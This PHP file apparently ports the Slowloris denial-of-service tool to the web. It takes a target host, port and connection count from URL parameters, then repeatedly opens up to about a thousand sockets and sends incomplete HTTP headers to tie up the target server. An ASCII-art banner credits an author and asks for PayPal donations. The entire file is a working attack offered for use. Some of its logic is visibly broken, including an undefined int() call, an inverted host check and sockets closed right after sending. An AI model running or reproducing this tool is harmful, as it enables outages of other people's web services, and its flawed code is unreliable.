<?php
error_reporting(0);
set_time_limit(0);
print '
<body bgcolor="#000000">
<pre style="color:white;">
CCCCCCCCCCOOCCOOOOO888\@8\@8888OOOOCCOOO888888888\@\@\@\@\@\@\@\@\@8\@8\@\@\@\@888OOCooocccc::::
CCCCCCCCCCCCCCCOO888\@888888OOOCCCOOOO888888888888\@88888\@\@\@\@\@\@\@888\@8OOCCoococc:::
CCCCCCCCCCCCCCOO88\@\@888888OOOOOOOOOO8888888O88888888O8O8OOO8888\@88\@\@8OOCOOOCoc::
CCCCooooooCCCO88\@\@8\@88\@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888\@8888OOOCc::::
CooCoCoooCCCO8\@88\@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88\@88888\@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88\@888OCoccc
ooooCCOO8O888888888\@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88\@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88\@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8\@\@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8\@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8\@\@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8\@8\@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888\@8\@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888\@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8\@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8\@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8\@8\@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888\@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
 Welcome to Slowloris - the low bandwidth, yet greedy and poisonous HTTP client [coded: Mogyiii (donate me: aimcreater@gmail.com (paypal))] 
 ';
$shost=$_GET['-shost'];
$host=$_GET['-dns'];
$httpready=$_GET['-httpready'];
$connections=$_GET['-num'];
$port=$_GET['-port'];
$cache=$_GET['-cache'];
$ssl=$_GET['-https'];
$tcpto=$_GET['-tcpto'];
$test=$_GET['-test'];
$version=$_GET['-version'];
$timeout=$_GET['-timeout'];
/*for ($i = 1; $i <= 11; $i++){
if('-shost'==$argv[$i]){
	$j=$i+1;
$shost    =    $argv[$j];
}
if('-dns'==$argv[$i]){
	$j=$i+1;
$host    =    $argv[$j];
}
if('-httpready'==$argv[$i]){
$httpready   =   $argv[$i];
}
if('-num'==$argv[$i]){
	$j=$i+1;
$connections    =    $argv[$j];
}
if('-cache'==$argv[$i]){
$cache   =   $argv[$i];
}
if('-port'==$argv[$i]){
	$j=$i+1;
$port    =    $argv[$j];
}
if('-https'==$argv[$i]){
$ssl  =  $argv[$i];
}
if('-tcpto'==$argv[$i]){
	$j=$i+1;
$tcpto    =    $argv[$j];
}
if('-test'==$argv[$i]){
$test   =   $argv[$i];
}
if('-timeout'==$argv[$i]){
	$j=$i+1;
$timeout    =    $argv[$j];
}
if('-version'==$argv[$i]){
	
 $version=$argv[$i];
}

}*/

if (!empty($version)) {
    print "Version 0.7\n";
    exit;
}

if (empty($host)) {
    print "Usage:\n\n\t.php?-dns=[www.example.com]&-options\n";
    print "\n\tType '.phpdoc $0' for help with options.\n\n";
    exit;
}

if (empty($port)) {
    $port = 80;
    print "Defaulting to port 80.\n";
}

if (empty($tcpto)) {
    $tcpto = 5;
    print "Defaulting to a 5 second tcp connection timeout.\n";
}
if(empty($timeout)) {
        $timeout = 100;
        print "Defaulting to a 100 second re-try timeout.\n";
    }
if (empty($test)) {
    $test='';

}
if (empty($connections)) {
        $connections = 1000;
        print "Defaulting to 1000 connections.\n";
    }

else {
    print "No multithreading capabilites found!\n";
    print "Slowloris will be slower than normal as a result.\n";
}

$packetcount     = 0;
$failed        = 0;
$connectioncount  = 0;



if (empty($shost)) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if (empty($httpready)) {
    $method = "POST";
}
else {
    $method = "GET";
}

if (!empty($test)) {
    $times = array("2", "30", "90", "240", "500" );
    $totaltime = 0;
    foreach ($times as $szamok) {
        $totaltime = $totaltime + $szamok;
    }
    $totaltime = $totaltime / 60;
    print "This test could take up to $totaltime minutes.\n";

$delay   = 0;
$working = 0;
$sock;

$working=1;
    if ($working==1) {
        if (!empty($cache)) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        $sock=fsockopen("$host",$port,$errno,$errstr);
                    $primarypayload ="$method /$rand HTTP/1.1\r\n";
                    $primarypayload .="Host: $sendhost\r\n";
                    $primarypayload .="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n";
                    $primarypayload .="Content-Length: 42\r\n";
          
          
        if ($sock1=fsockopen("$host",$port,$errno,$errstr)) {
            print "Connection successful, now comes the waiting game...\n";
        }
        else {
            print
"That's odd - I connected but couldn't send the data to $host:$port.\n";
            print "Is something wrong?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm... I can't connect to $host:$port.\n";
        print "Is something wrong?\nDying.\n";
        exit;
    }
    for ( $i = 0 ; $i <= $totaltime ; $i++ ) {
		
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ($errno!=0) {
            print "\tWorked.\n";
            $delay = $times[$i];
            
        }
        else {
            
                $delay = $times[ $i - 1 ];
                
                
            
            print "\tFailed after $times[$i] seconds.\n";
        }
    }

    if ( $primarypayload .= "Connection: Close\r\n\r\n" ) {
        print "Okay that's enough time. Slowloris closed the socket.\n";
        print "Use $delay seconds for -timeout.\n";
        
          fclose($sock);
        exit;
    }
    else {
        print "Remote server closed socket.\n";
        print "Use $delay seconds for -timeout.\n";
         
          fclose($sock);
        exit;
    }
    if ( $delay < 166 ) {
        print '
Since the timeout ended up being so small ($delay seconds) and it generally 
takes between 200-500 threads for most servers and assuming any latency at 
all...  you might have trouble using Slowloris against this target.  You can 
tweak the -timeout flag down to less than 10 seconds but it still may not 
build the sockets in time.';

    }
    exit;
}
else {
    print
"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";

doconnections($host,$port,$timeout,$sendhost,$connections,$method,$cache);

}

function doconnections($host,$port,$timeout,$sendhost,$num,$method,$cache) {
/*print $host.":".$port."timed:".$timeout."sendhost:".$sendhost."connections:".$num."method:".$method."0?=".$cache; debug
break;*/
if(empty($sendhost)){
	
$host=$sendhost;
}
    $failedconnections = 0;
    $working = 0;    
    $first= 0;    
    while (1) {
        $failedconnections = 0;
        print "\t\tBuilding sockets.\n";
        try {
for ($z = 0; $z <= $num; $z++){


                    if (!empty($cache)) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    $sock[$z]=fsockopen("$host",$port,$errno,$errstr,$timeout);
                    $primarypayload ="$method /$rand HTTP/1.1\r\n";
                    $primarypayload .="Host: $sendhost\r\n";
                    $primarypayload .="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n";
                    $primarypayload .="Content-Length: 42\r\n";
                      fwrite($sock[$z],$primarypayload);
                    if ($errno!=0) {
                            
                            fclose($sock[$z]);
                            $failed++;
                            $failedconnections++;
                        }
                    

                        
                        else {
                            $packetcount++;
                            
                        }
}
			for($z=0;$z<=$num;$z++){
			fclose($sock[$z]);
}


}
catch (Exception $e){

}
        print
"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}



?>
